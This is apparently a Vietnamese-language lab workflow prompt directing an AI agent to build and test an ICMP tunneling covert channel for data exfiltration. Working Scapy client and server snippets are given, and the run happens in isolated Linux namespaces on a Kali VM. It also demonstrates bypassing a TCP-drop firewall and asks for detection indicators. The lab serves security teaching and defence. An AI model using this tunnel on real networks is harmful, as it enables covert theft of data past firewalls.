# WORKFLOW EXECUTION: LAB 03 - ICMP TUNNELING (COVERT CHANNEL / DATA EXFILTRATION)

Bạn hãy đóng vai trò là một **Senior Network Security Analyst, Malware & Data Exfiltration Specialist và Linux Systems Engineer**.

## 1. MỤC TIÊU & BỐI CẢNH KỸ THUẬT
- **Mục tiêu:** Triển khai và kiểm chứng kỹ thuật tạo kênh ngầm (Covert Channel) qua giao thức ICMP để rò rỉ dữ liệu (Exfiltration) vượt qua tường lửa kiểm soát tầng Transport (L4).
- **Cơ chế cốt lõi:** Gói ICMP Echo Request (Type 8) và Echo Reply (Type 0) có vùng payload tùy biến. Kẻ tấn công băm nhỏ dữ liệu nhạy cảm (file/token) và nhồi vào payload của các gói tin ping. Do nhiều hệ thống mạng chỉ siết chặt port TCP/UDP mà cho phép ICMP để phục vụ ping/troubleshoot, dữ liệu bị tuồn ra ngoài trót lọt.
- **Mục tiêu phòng thủ:** Nhận biết các đặc trưng bất thường của ICMP Tunnel (kích thước payload lệch chuẩn 56 bytes, entropy dữ liệu, tần suất gửi) và giải pháp giám sát biên mạng (Egress Filtering / DPI / IDS).

---

## 2. QUY TRÌNH THỰC THI CHI TIẾT (5 GIAI ĐOẠN)

### GIAI ĐOẠN 1: Chuẩn bị Script Cục bộ & Khởi tạo Topology
1. Tạo thư mục `docs/progress/LAB03/scripts/` trên workspace host.
2. Tạo script `setup_pair.sh`:
   - Dọn dẹp sạch các namespace cũ (`h1`, `h2`) và link (`veth1`, `veth2`) nếu còn tồn tại.
   - Dựng 2 namespace: `h1` (`10.0.0.1/24`) đóng vai Client (nội bộ), `h2` (`10.0.0.2/24`) đóng vai Server (bên ngoài).
   - **Tắt auto-reply của Linux Kernel trên Server (h2):**
     ```bash
     ip netns exec h2 sysctl -w net.ipv4.icmp_echo_ignore_all=1
     ```
     (để tránh kernel tự phản hồi echo reply, nhường toàn quyền xử lý cho Scapy server).
   - Kiểm tra kết nối ping baseline giữa `h1` và `h2`.
3. Tạo script `icmp_server.py` (chạy trên `h2`):
   - Sử dụng `sniff(iface="veth2", filter="icmp", prn=handle)`.
   - Hàm `handle(p)`: Bắt các gói ICMP có `type == 8`, trích xuất `bytes(p[ICMP].payload)`, in ra console, đồng thời gửi lại gói phản hồi:
     ```python
     reply = IP(dst=p[IP].src) / ICMP(type=0, id=p[ICMP].id, seq=p[ICMP].seq) / (b"ACK:" + data)
     ```
4. Tạo script `icmp_client.py` (chạy trên `h1`):
   - Đọc dữ liệu từ `/etc/hostname` (hoặc chuỗi token bí mật `secret-token-ABC123`).
   - Chia nhỏ dữ liệu thành từng khối (`chunk = 24 bytes`).
   - Gửi từng đoạn dữ liệu qua hàm:
     ```python
     ans = sr1(IP(dst="10.0.0.2") / ICMP(type=8, id=0x1337, seq=i // chunk) / seg, timeout=2, verbose=0)
     ```
     và in phản hồi ACK nhận được từ server.

### GIAI ĐOẠN 2: Triển khai lên Kali VM & Kiểm tra Cấu hình Kernel
1. Sử dụng `ssh_execute` để tạo thư mục `/tmp/lab03` trên Kali VM.
2. Đẩy các file script lên Kali VM và phân quyền thực thi.
3. Chạy `setup_pair.sh` và kiểm tra lại giá trị sysctl:
   ```bash
   ip netns exec h2 sysctl net.ipv4.icmp_echo_ignore_all
   ```
   Xác nhận giá trị trả về bằng 1.

### GIAI ĐOẠN 3: Khởi chạy Máy chủ ICMP & Mở Giám sát Bắt gói
1. **Khởi chạy ICMP Server chạy nền trên `h2`:**
   Lưu tiến trình nền và ghi log ra file:
   ```bash
   ip netns exec h2 python3 /tmp/lab03/icmp_server.py > /tmp/lab03/server.log 2>&1 &
   echo $! > /tmp/lab03/server.pid
   ```
   Chờ 2 giây để tiến trình lắng nghe sẵn sàng.
2. **Khởi chạy `tcpdump` trên `h2`:**
   Chạy chế độ in ASCII (`-A`) với timeout để bắt trọn dữ liệu truyền qua payload:
   ```bash
   ip netns exec h2 timeout 8 tcpdump -i veth2 -nn -A icmp > /tmp/lab03/tcpdump_payload.log 2>&1 &
   ```

### GIAI ĐOẠN 4: Thực thi Tuồn Dữ liệu (Data Exfiltration)
1. Thực thi `icmp_client.py` từ namespace `h1`:
   ```bash
   ip netns exec h1 python3 /tmp/lab03/icmp_client.py
   ```
2. Đọc file `/tmp/lab03/server.log` trên `h2` để xác nhận máy chủ đã nhận đầy đủ payload.
3. Đọc file `/tmp/lab03/tcpdump_payload.log` để kiểm tra chuỗi dữ liệu rõ ràng (cleartext ASCII) xuất hiện trong các gói ICMP.

### GIAI ĐOẠN 5: Chứng minh Vượt Tường lửa (Bypass L4 TCP Drop) & Dọn dẹp
1. **Thiết lập tường lửa chặn TCP trên `h2`:**
   ```bash
   ip netns exec h2 iptables -A INPUT -p tcp -j DROP
   ```
2. **Kiểm tra kết nối TCP thông thường:**
   Dùng `nc` thử kết nối tới cổng 9000 của `h2`:
   ```bash
   ip netns exec h1 nc -w2 10.0.0.2 9000; echo "TCP ket qua: $?"
   ```
   Xác nhận kết nối thất bại (mã thoát khác 0 do timeout/drop).
3. **Thực thi lại ICMP Tunnel:**
   Chạy lại `icmp_client.py` và chứng minh dữ liệu vẫn được truyền và nhận ACK bình thường qua kênh ICMP dù TCP đã bị chặn hoàn toàn.
4. **Dọn dẹp môi trường:**
   - Dừng các tiến trình nền bằng cách kill PID từ `/tmp/lab03/server.pid` và `pkill -f icmp_server.py`.
   - Xóa các rule iptables đã thêm trên `h2`:
     ```bash
     ip netns exec h2 iptables -F
     ```
   - Xóa namespace:
     ```bash
     ip netns del h1 2>/dev/null || true
     ip netns del h2 2>/dev/null || true
     rm -rf /tmp/lab03
     ```
5. Cập nhật trạng thái `[x]` cho Lab 03 trong file `PLAN.md`.

---

## 3. YÊU CẦU CẤU TRÚC BÁO CÁO docs/progress/LAB03/lab3_result.md
Tệp báo cáo kết quả phải bao gồm:
- **Metadata:** Thời gian thực thi, phiên bản Kernel, công cụ sử dụng.
- **Terminal Outputs thô (Raw Logs):** Toàn bộ log của `setup_pair.sh`, `server.log`, `icmp_client` stdout, `tcpdump_payload.log`, và kết quả test iptables.
- **BÓC TÁCH & PHÂN TÍCH CHUYÊN SÂU LOG TERMINAL (BẮT BUỘC):**
  - **Phân tích Cơ chế Payload:** Trích xuất đoạn log tcpdump chứa chuỗi ASCII. Giải thích cấu trúc gói tin ICMP Echo Request (Type 8, Code 0, ID 0x1337) và tại sao giao thức TCP/IP lại cho phép chèn payload tùy ý vào sau ICMP Header.
  - **Phân tích Cơ chế Phản hồi Kênh 2 Chiều:** Giải thích luồng Echo Reply (Type 0) mang tiền tố `b"ACK:"` gửi trả lại cho client.
  - **Phân tích Vượt Tường lửa (Bypass L4 Filtering):** So sánh kết quả trả về của lệnh `nc` (TCP exit code $\neq 0$) với script ICMP (thành công). Phân tích vì sao các bộ lọc Stateless/Stateful dựa trên Port L4 hoàn toàn bất lực trước Covert Channel L3.
  - **Đánh giá Phương pháp Phát hiện:** Đề xuất 3 chỉ dấu (Indicators) cụ thể để hệ thống IDS/IPS phát hiện kênh ngầm này (dựa vào payload size, entropy, tần suất gửi, hoặc cờ nhận dạng id=0x1337).

---

## 4. STRICT RULES
- Mọi thao tác thực thi BẮT BUỘC thông qua `kali-vm:ssh_execute`.
- Quản lý chặt chẽ tiến trình nền `icmp_server.py`: Luôn ghi PID ra file để kill sau khi hoàn tất, tuyệt đối không để process chạy ngầm chiếm socket.
- Lệnh `tcpdump` bắt buộc phải bọc bằng `timeout 8` để tránh làm kẹt phiên SSH.
- Toàn bộ nội dung trong `lab3_result.md` phải là log thực tế trích từ terminal Kali VM.
